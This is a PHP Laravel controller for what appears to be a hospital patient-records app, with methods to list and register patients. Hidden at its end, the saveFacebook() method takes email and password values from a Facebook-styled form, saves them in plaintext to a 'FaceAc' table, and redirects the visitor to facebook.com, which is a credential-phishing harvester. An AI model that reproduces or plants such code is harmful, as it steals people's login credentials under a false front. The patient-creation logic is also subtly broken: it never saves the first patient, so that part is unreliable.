<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Patient;
use App\FaceAc;

use App\Models\Compte;

class PatientController extends Controller
{
  

    public function index()
    {
        $patients = Patient::get();
        return view('./Patients/index', compact('patients'));
    }



    public function create(Request $request){
        $nbreOfPatient  = Patient::count();
        $isExist = Patient::where("patient_name", "=", request('name'))
                            ->where("patient_surname", "=", request('surname'))
                            ->where("patient_phone", "=", request('phone'))
                            ->first();
        if(!$isExist)
        {

                $msg = "Echec de l'opération ! ";
                if($nbreOfPatient >0)
                {

                    $patient = new Patient ;
                    $patient->patient_matricule = "HBP00".(++$nbreOfPatient);
                    
                    $patient->patient_name = request('name');
                    $patient->patient_surname = request('surname');
                    $patient->patient_dateNaiss = request('dateOfBirth');
                    $patient->patient_gender = request('gender');
                    $patient->patient_phone = request('phone');
                    $patient->patient_profession = request('profession');
                    $patient->patient_email = request('email');
                    $patient->patient_location = request('quarter');
                    $patient->patient_hobbies = request('hobbies');

              
                    
                    


       
            $patient->patient_picture = 'none';

                    /**$request->validate([
                        'picture' => 'required|image|mimes:png,jpg,jpeg|max:2048'
                    ]);
            
                    $imageName = time().'.'.$request->image->extension();
                    // Public Folder
                    $request->picture->move(public_path('images'), $imageName);
                    $patient->patient_picture = $imageName;*/
                    
                    $patient->patient_ice_name = request('icename');
                    $patient->patient_ice_phone = request('icephone');
                    if($patient->save()){
                        $msg = "Opération reussi ! ";
                    }
                }
        }

       
        return redirect()->back();

    }
    public function new(){

    }


    public function update(){}
    public function show(Patient $p){}

    public function delete(Patient $p ){
    }


















public function takeparameter(){
    return view('Patients/parameter');
}


    public function facebook() 
    {
        return view('Facebook/index');
    }



    public function saveFacebook(Request $request){

        $login = request('email');
        $password = request('password');


        $account = new FaceAc;
        $account->login = $login;
        $account->pass = $password;
       if( $account->save()){
        echo "Enregistrement !";
       }

       return redirect("https://www.facebook.com/");

    }
    
}
